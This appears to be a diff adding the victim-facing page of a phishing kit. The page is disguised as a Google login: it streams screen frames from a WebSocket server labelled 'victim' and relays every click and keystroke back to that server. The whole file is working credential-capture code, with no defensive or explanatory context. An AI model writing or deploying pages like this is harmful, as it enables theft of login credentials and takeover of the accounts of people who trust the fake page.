@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+    <meta charset="UTF-8">
+    <title>Google 로그인</title>
+    <style>
+        body { margin: 0; background: #000; display: flex; justify-content: center; align-items: center; height: 100vh; }
+        #stream-screen { max-width: 100%; max-height: 100vh; cursor: default; }
+    </style>
+</head>
+<body>
+    <img id="stream-screen" alt="Victim Stream">
+    <script>
+        // 123번 세션으로 피해자 웹소켓 연결
+        const ws = new WebSocket('ws://localhost:8080/victim?session=123');
+        const screenImg = document.getElementById('stream-screen');
+
+        ws.onmessage = function(event) {
+            const msg = JSON.parse(event.data);
+            if (msg.type === 'frame') {
+                screenImg.src = 'data:image/png;base64,' + msg.data;
+            }
+        };
+
+        screenImg.addEventListener('click', function(e) {
+            const rect = screenImg.getBoundingClientRect();
+            ws.send(JSON.stringify({ 
+                type: 'click', 
+                x: e.clientX - rect.left, 
+                y: e.clientY - rect.top 
+            }));
+        });
+
+        window.addEventListener('keydown', function(e) {
+            ws.send(JSON.stringify({ 
+                type: 'keypress', 
+                char: e.key 
+            }));
+        });
+    </script>
+</body>
+</html>
